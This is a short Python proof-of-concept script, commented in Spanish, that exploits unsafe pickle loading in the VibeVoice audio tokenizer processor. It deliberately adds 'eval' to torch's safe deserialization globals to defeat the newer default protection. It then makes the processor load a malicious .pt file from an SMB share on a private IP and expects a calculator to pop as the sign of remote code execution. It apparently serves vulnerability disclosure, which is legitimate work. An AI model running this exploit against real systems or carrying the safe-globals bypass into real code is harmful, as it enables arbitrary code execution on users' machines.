import os
import torch
# Importación correcta del módulo
from vibevoice.processor.vibevoice_tokenizer_processor import VibeVoiceTokenizerProcessor
# --- CONFIGURACIÓN PARA DEMOSTRACIÓN DE RCE (Agnóstico a la versión de Torch) ---
# En versiones modernas de Torch (2.6+), el sistema bloquea 'eval' por defecto.
# Para demostrar la vulnerabilidad del sink de VibeVoice, permitimos el global 'eval'.
try:
    torch.serialization.add_safe_globals([eval])
except AttributeError:
    # Versiones antiguas no requieren/tienen esta función
    pass
# ------------------------------------------------------------------------------
class RCE:
    pass
# Inicializar el procesador de audio (sink directo)
processor = VibeVoiceTokenizerProcessor()
# Ruta maliciosa (SMB Share)
malicious_path = r'\\192.168.1.90\lab_share\exploit.pt'
print(f"[*] Iniciando carga maliciosa desde: {malicious_path}")
try:
    # Al haber permitido 'eval' arriba, esto funcionará incluso en Torch 2.11.0
    processor(audio=malicious_path)
except Exception as e:
    print(f"[!] Error: {e}")
print("[*] Proceso finalizado. Verifica la calculadora.")